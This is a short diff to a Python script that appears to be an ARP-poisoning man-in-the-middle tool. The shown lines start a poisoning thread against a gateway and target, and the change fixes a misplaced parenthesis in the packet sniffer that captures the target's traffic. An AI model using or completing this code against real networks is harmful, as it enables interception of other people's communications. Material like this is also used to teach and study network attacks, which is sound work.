@@ -71,9 +71,9 @@ poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway
 poison_thread.start()
 
 try:
-    print("[*] Starting sniffer for %d packets" % packet_count
-    bpf_filter  = "ip host %s" % target_ip
-    packets = sniff(count=packet_count,filter=bpf_filter) )   
+    print("[*] Starting sniffer for %d packets" % packet_count)
+    bpf_filter = "ip host %s" % target_ip
+    packets = sniff(count=packet_count,filter=bpf_filter)   
 except KeyboardInterrupt:
 	pass
 
